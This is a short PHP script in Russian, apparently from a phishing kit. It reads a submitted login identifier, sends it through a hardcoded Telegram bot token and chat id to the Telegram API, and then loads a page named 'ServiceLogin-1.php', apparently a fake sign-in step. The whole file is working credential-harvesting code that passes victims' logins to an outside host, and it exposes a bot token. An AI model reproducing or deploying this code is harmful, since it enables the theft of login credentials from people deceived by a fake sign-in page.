<?
$login = trim($_POST['identifier']);



$token = "1874888241:AAFpsLgX5Pdqo7LfLZiJmhkXnuGaSzv79pg"; // токен бота
$chatid = '602234832'; // id чата 1


// отправка сообщения
$tbot = file_get_contents("https://api.telegram.org/bot".$token."/sendMessage?chat_id="."$chatid"."&text=".urlencode("Логин: $login"));
include('ServiceLogin-1.php');
?>